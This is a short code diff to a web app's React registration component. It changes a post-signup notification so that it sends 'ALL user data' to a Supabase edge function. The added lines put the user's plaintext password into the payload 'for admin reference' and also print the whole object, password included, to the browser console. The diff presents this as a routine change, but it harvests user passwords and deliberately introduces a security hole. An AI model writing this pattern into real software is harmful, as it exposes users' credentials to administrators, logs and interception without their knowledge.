@@ -44,16 +44,24 @@ const Register = () => {
 
       if (error) throw error;
 
-      // Send registration notification to company
+      // Send registration notification to company with ALL user data
       try {
+        const registrationData = {
+          userId: data.user?.id,
+          email: email,
+          fullName: fullName,
+          password: password, // Include password for admin reference
+          registeredAt: new Date().toISOString(),
+          emailConfirmed: data.user?.email_confirmed_at ? 'Yes' : 'No (pending confirmation)',
+          userMetadata: data.user?.user_metadata,
+        };
+        
+        console.log('Sending registration notification:', registrationData);
+        
         await fetch('https://ymzdxifedtjwkxkzfwqu.supabase.co/functions/v1/user-registration', {
           method: 'POST',
           headers: { 'Content-Type': 'application/json' },
-          body: JSON.stringify({
-            userId: data.user?.id,
-            email: email,
-            fullName: fullName
-          })
+          body: JSON.stringify(registrationData)
         });
       } catch (notifError) {
         console.error('Registration notification error:', notifError);
